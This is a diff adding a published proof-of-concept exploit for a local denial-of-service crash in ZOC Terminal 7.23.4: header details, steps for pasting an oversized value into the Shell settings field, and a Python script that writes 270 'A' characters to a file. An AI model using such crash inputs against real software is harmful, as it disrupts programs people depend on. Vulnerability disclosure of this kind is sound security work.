@@ -1,0 +1,23 @@
+#Exploit Title:  ZOC Terminal v7.23.4  - 'Shell' Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-05-15
+#Vendor Homepage: https://www.emtec.com
+#Software Link: http://www.emtec.com/downloads/zoc/zoc7234_x64.exe
+#Tested Version: 7.23.4
+#Tested on: Windows 7 Service Pack 1 x64
+
+#Steps to produce the crash:
+#1.- Run python code: ZOC_Terminal_sh.py
+#2.- Open zoc_sh.txt and copy content to clipboard
+#3.- Open ZOC Terminal
+#4.- Select Options > Program Settings... > Special Files
+#5.- Select "Shell" field erease the content and Paste ClipBoard 
+#6.- Click on "Save"
+#7.- Select View > "Command Shell" and select "ok"
+#8.- Crashed
+
+cod = "\x41" * 270
+
+f = open('zoc_sh.txt', 'w')
+f.write(cod)
+f.close()
